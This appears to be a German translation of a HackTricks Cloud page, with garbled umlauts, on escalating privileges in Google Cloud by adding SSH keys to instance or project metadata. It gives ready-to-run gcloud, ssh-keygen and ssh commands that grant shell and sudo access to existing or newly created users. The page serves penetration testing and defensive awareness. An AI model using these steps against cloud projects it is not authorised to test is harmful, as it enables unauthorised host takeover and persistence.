# GCP - Hinzuf√ºgen von benutzerdefinierten SSH-Metadaten

{% hint style="success" %}
Lernen Sie und √ºben Sie AWS-Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Lernen Sie und √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys senden.

</details>
{% endhint %}

## √Ñndern der Metadaten <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Die √Ñnderung von Metadaten auf einer Instanz kann zu **erheblichen Sicherheitsrisiken f√ºhren, wenn ein Angreifer die erforderlichen Berechtigungen erlangt**.

### **Integration von SSH-Schl√ºsseln in benutzerdefinierte Metadaten**

Auf GCP f√ºhren **Linux-Systeme** h√§ufig Skripte aus der [Python Linux-Gastumgebung f√ºr Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) aus. Ein wichtiger Bestandteil davon ist der [Accounts-Daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), der dazu dient, **regelm√§√üig** den Metadaten-Endpunkt der Instanz auf **Aktualisierungen der autorisierten SSH-Public Keys** zu √ºberpr√ºfen.

Daher k√∂nnte ein Angreifer, der benutzerdefinierte Metadaten √§ndern kann, den Daemon dazu bringen, einen neuen √∂ffentlichen Schl√ºssel zu finden, der verarbeitet und in das lokale System **integriert wird**. Der Schl√ºssel wird in die Datei `~/.ssh/authorized_keys` eines **bestehenden Benutzers hinzugef√ºgt oder m√∂glicherweise einen neuen Benutzer mit `sudo`-Berechtigungen erstellen**, abh√§ngig vom Format des Schl√ºssels. Der Angreifer wird dann in der Lage sein, den Host zu kompromittieren.

### **SSH-Schl√ºssel zu vorhandenem privilegierten Benutzer hinzuf√ºgen**

1. **Existierende SSH-Schl√ºssel auf der Instanz √ºberpr√ºfen:**
- F√ºhren Sie den Befehl aus, um die Instanz und ihre Metadaten zu beschreiben und vorhandene SSH-Schl√ºssel zu lokalisieren. Der relevante Abschnitt in der Ausgabe befindet sich unter `metadata`, speziell unter dem Schl√ºssel `ssh-keys`.
```bash
gcloud compute instances describe [INSTANZ] --zone [ZONE]
```
- Achten Sie auf das Format der SSH-Schl√ºssel: Der Benutzername geht dem Schl√ºssel voraus, getrennt durch einen Doppelpunkt.

2. **Textdatei f√ºr SSH-Schl√ºsselmetadaten vorbereiten:**
- Speichern Sie die Details von Benutzernamen und ihren entsprechenden SSH-Schl√ºsseln in einer Textdatei mit dem Namen `meta.txt`. Dies ist wichtig, um die vorhandenen Schl√ºssel zu erhalten und neue hinzuzuf√ºgen.

3. **Einen neuen SSH-Schl√ºssel f√ºr den Zielbenutzer generieren (`alice` in diesem Beispiel):**
- Verwenden Sie den Befehl `ssh-keygen`, um einen neuen SSH-Schl√ºssel zu generieren, wobei darauf geachtet wird, dass das Kommentarfeld (`-C`) mit dem Zielbenutzernamen √ºbereinstimmt.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- F√ºgen Sie den neuen √∂ffentlichen Schl√ºssel zu `meta.txt` hinzu, wobei das Format aus den Metadaten der Instanz nachgeahmt wird.

4. **Aktualisieren der SSH-Schl√ºsselmetadaten der Instanz:**
- Wenden Sie die aktualisierten SSH-Schl√ºsselmetadaten auf die Instanz mit dem Befehl `gcloud compute instances add-metadata` an.
```bash
gcloud compute instances add-metadata [INSTANZ] --metadata-from-file ssh-keys=meta.txt
```

5. **Zugriff auf die Instanz mit dem neuen SSH-Schl√ºssel:**
- Verbinden Sie sich mit SSH mit dem neuen Schl√ºssel mit der Instanz und greifen Sie auf die Shell im Kontext des Zielbenutzers (`alice` in diesem Beispiel) zu.
```bash
ssh -i ./key alice@localhost
sudo id
```

### **Einen neuen privilegierten Benutzer erstellen und einen SSH-Schl√ºssel hinzuf√ºgen**

Wenn kein interessanter Benutzer gefunden wird, ist es m√∂glich, einen neuen zu erstellen, dem `sudo`-Berechtigungen erteilt werden:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### SSH-Schl√ºssel auf Projektebene <a href="#sshing-around" id="sshing-around"></a>

Es ist m√∂glich, den SSH-Zugriff auf mehrere virtuelle Maschinen (VMs) in einer Cloud-Umgebung zu erweitern, indem **SSH-Schl√ºssel auf Projektebene angewendet** werden. Dieser Ansatz erm√∂glicht den SSH-Zugriff auf jede Instanz innerhalb des Projekts, die nicht explizit die projektweiten SSH-Schl√ºssel blockiert hat. Hier ist eine zusammengefasste Anleitung:

1. **SSH-Schl√ºssel auf Projektebene anwenden:**
- Verwenden Sie den Befehl `gcloud compute project-info add-metadata`, um SSH-Schl√ºssel aus `meta.txt` zu den Metadaten des Projekts hinzuzuf√ºgen. Diese Aktion stellt sicher, dass die SSH-Schl√ºssel auf allen VMs im Projekt erkannt werden, es sei denn, eine VM hat die Option "Projektweite SSH-Schl√ºssel blockieren" aktiviert.
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **SSH auf Instanzen mit projektweiten Schl√ºsseln durchf√ºhren:**
- Mit projektweiten SSH-Schl√ºsseln k√∂nnen Sie auf jede Instanz innerhalb des Projekts zugreifen. Instanzen, die projektweite Schl√ºssel nicht blockieren, akzeptieren den SSH-Schl√ºssel und gew√§hren Zugriff.
- Eine direkte Methode, um sich bei einer Instanz anzumelden, ist die Verwendung des Befehls `gcloud compute ssh [INSTANZ]`. Dieser Befehl verwendet Ihren aktuellen Benutzernamen und die auf Projektebene festgelegten SSH-Schl√ºssel, um den Zugriff zu versuchen.


# Referenzen
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
